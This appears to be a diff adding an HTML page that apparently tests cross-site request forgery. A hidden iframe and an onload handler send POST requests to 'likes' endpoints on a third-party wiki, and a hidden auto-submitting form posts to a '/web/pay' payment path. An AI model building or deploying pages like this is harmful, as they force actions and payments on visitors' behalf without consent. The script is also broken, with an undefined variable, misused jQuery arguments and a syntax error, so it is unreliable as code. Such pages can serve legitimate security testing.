@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js">
+    </script>
+</head>
+<iframe src="https://wiki.dslbuy.com/rest/likes/1.0/content/14247594/likes">
+
+</iframe>
+<script>
+
+
+    //@创建表单方法
+    function post(URL, PARAMS) {
+        var temp = document.createElement("form");
+        temp.action = URL;
+        temp.method = "post";
+        temp.target = "_blank";
+        temp.style.display = "none";
+        for (var x in PARAMS) {
+            var opt = document.createElement("input");
+            opt.type = "text";
+            opt.name = x;
+            opt.value = PARAMS[x];
+            temp.appendChild(opt);
+        }
+        document.body.appendChild(temp);
+        temp.submit();
+        return temp;
+    };
+    /***
+     * 调用表单方法
+     * @param url
+     * @param data
+     */
+    post('/web/pay', {goods_param: str});
+
+    let url = "https://wiki.dslbuy.com/rest/likes/1.0/content/14247594/likes";
+
+    $("body").load(httpPost(url));
+
+    //发送POST请求跳转到指定页面
+    function httpPost(url) {
+        $.post(
+            "Access-Control-Allow-Origin",
+            url,
+            function (data, status) {
+                alert("Data: " + data + "nStatus: " + status);
+            },
+            origin
+    :
+        ""
+    )
+        ;
+    }
+</script>
+<body onload="httpPost('https://wiki.dslbuy.com/rest/likes/1.0/content/14249402/likes',null)">
+</body>
+</html>
